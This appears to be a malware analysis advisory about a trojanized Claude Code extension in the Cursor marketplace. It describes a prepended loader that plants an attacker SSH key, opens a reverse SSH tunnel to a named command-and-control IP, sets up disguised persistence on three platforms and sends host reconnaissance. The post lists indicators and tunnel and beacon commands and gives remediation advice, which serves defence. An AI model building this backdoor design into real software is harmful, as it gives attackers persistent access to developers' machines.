text: The official Claude Code extension in the Cursor marketplace was compromised today. Yes, you heard that right. A malicious version, 2.1.313 was published to the Cursor Marketplace, today, October 29th, 2026. The extension identifies itself as anthropic.claude-code version 2.1.313 , but its main JavaScript bundle contains a malicious 66-line loader inserted before the legitimate extension code. What is malicious: Claude-code extension from Cursor marketplace version 2.1.313 What is not malicious: The @anthropic-ai/claude-code NPM package is NOT malicious The OpenVSX extension is NOT malicious The Microsoft VSCode extension for Claude is NOT malicious The unpacked extension is exactly like the normal version, and the bundled binary is the official binary as well. The only thing that's different is the extension.js file. The extension activates after VS Code startup and when its webview opens and runs the extension.js file. It adds an attacker-controlled key to the user’s SSH configuration, attempts to enable the local SSH service, establishes a reverse tunnel to 134.209.82.225 , installs platform-specific persistence, and transmits host reconnaissance over an unencrypted HTTP beacon. Static inspection of the main entry point quickly paints a picture: The first line starts a standalone, immediately invoked function that imports Node.js process, filesystem, operating-system, HTTP, and cryptographic modules. That function ends at line 66. Only after it finishes does the expected bundled extension begin. This placement matters: the user doesn't need to begin a Claude conversation. Loading the extension module is enough. The package declares no install, build, prepare, preinstall, or postinstall scripts, so the malicious behavior occurs at extension runtime rather than through a package-manager lifecycle hook. The provenance of the analyzed directory is not established. These findings show that this specific artifact is malicious; they do not, by themselves, demonstrate that Anthropic’s official Marketplace release or distribution infrastructure was compromised. Threat Type: Trojanized developer-tool extension and persistent SSH backdoor Affected Ecosystem: Visual Studio Code extensions Claimed Package: anthropic.claude-code@2.1.313 Impact: Persistent remote access through an authorized SSH key and reverse SSH tunnel C2: 134.209.82.225 over SSH and HTTP port 8099 Key Finding: Malicious code is prepended to the normal extension bundle and executes before legitimate initialization Additional Payloads: None downloaded by the injected stage; its curl requests retrieve only public-IP text Big shout out to Dean Hardcastle for looping us in when he saw this happen in real time. At load time, the implant collects: Hostname and local username Operating system and CPU architecture Home directory and current working directory Global Git email from git config --global user.email Names of up to 40 environment variables containing KEY , TOKEN , SECRET , PASS , AWS , or GCP Environment-variable values are not placed directly in the initial beacon. Their names can still reveal which cloud providers, CI systems, and credential types are configured. More importantly, successful SSH access would allow the operator to inspect the account directly. Nearly every exception is suppressed. This lets the legitimate extension continue loading when malicious operations fail, reducing visible signs of compromise. If a home directory is available, the implant creates ~/.ssh , changes it to mode 0700 , and appends an Ed25519 key to ~/.ssh/authorized_keys . The key is labeled svc-telemetry , an innocuous-looking comment intended to resemble an administrative account. ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry Its fingerprint is: SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk The implant sets authorized_keys to mode 0600 . If the marker already exists, it records that fact instead of adding a duplicate. The next branch attempts to make the victim reachable through SSH: macOS: checks Remote Login and, if disabled, runs sudo -n systemsetup -setremotelogin on Linux: checks sshd or ssh with systemctl , then tries several service-start commands Windows: uses PowerShell to install OpenSSH Server, configure automatic startup, and start sshd These operations may fail without sufficient privileges, but failure does not stop the remaining attack chain. The implant embeds a base64-encoded OpenSSH private key and decodes it into a temporary file named .stk_<identifier> . The identifier derives from the hostname and home directory. The decoded private key has SHA-256: 7e0a52885fadee05544a9e99eb18c792bec05900a5e1a66d68f8383decb0e278 It repeatedly connects to: tunnel@134.209.82[.]225 The core forwarding request is: -N -R '*:0:localhost:22' This asks the remote SSH server to allocate a port and forward connections through the tunnel to port 22 on the victim. Whether that port is reachable beyond the C2 host depends on the server’s SSH configuration, but the operator controlling the server can use the tunnel directly. The connection disables host-key verification, ignores the user’s known-hosts file, uses the embedded identity exclusively, and reconnects after 60 seconds. On Unix-like systems it prefers autossh and otherwise uses ssh . The loader implements three platform branches. On macOS it writes: ~/.config/.smt ~/.config/.smtk ~/Library/LaunchAgents/com.apple.sysmond.plist .smt reconstructs the private key and continuously launches the tunnel. The LaunchAgent uses RunAtLoad and KeepAlive , then loads with launchctl load -w . The com.apple.sysmond name is deceptive; this user LaunchAgent is not an Apple component. On Linux, the same files are written under ~/.config , and the script is added to the user’s crontab with an @reboot entry. On Windows, the malware writes .config\smt.cmd and .config\smtk , then attempts to create an on-start scheduled task named SysMon running as SYSTEM . If that cannot be confirmed, it copies sysmon.cmd into the user’s Startup folder. After 1.5 seconds, the malware obtains the public IP using: curl -s --max-time 4 ifconfig.me curl -s --max-time 4 https://api.ipify.org It sends the collected JSON to: http://127.0.0.1:8099/beacon http://134.209.82.225:8099/beacon The response is discarded. There is no response-to-code behavior in the injected stage, and returned data is not saved as a payload or configuration. No additional executable or script is downloaded by the injected loader. Its network behaviour consists of public-IP text lookups, JSON beacon uploads, and an interactive SSH tunnel. The shell and batch scripts and tunnel keys are generated or decoded from content already inside the extension. They are not secondary downloads. That distinction does not reduce the severity: the tunnel provides an operator-controlled route to the victim’s SSH service. Follow-on commands or files transferred after access would not appear in this static artifact. No blockchain addresses, RPC endpoints, contracts, wallets, or blockchain-resolved payload locations were found. On macOS, inspect loaded LaunchAgents and each user’s authorized_keys . Process telemetry may show long-running ssh or autossh commands containing -R *:0:localhost:22 . If the artifact was loaded, disconnect the system, preserve forensic evidence, and block 134.209.82.225 on ports 22 and 8099. Remove the extension and persistence only after collecting evidence. Rotate credentials accessible to the affected account from a known-clean system. Because this implant creates an interactive path to SSH, its observable files may not represent the full compromise. Review SSH, shell, process, VS Code, authentication, and network logs for follow-on activity. Rebuilding the host is safer than assuming removal of known artifacts restores trust. This sample demonstrates an effective way to weaponize a trusted developer tool: place a compact backdoor before a large legitimate bundle, suppress errors, and let the expected application continue. The extension retains its normal interface while quietly establishing durable SSH access. The evidence supports conclusions about the analyzed artifact only. Distribution source, attacker identity, infrastructure ownership, and the status of any official release remain unverified and should not be inferred from package branding.
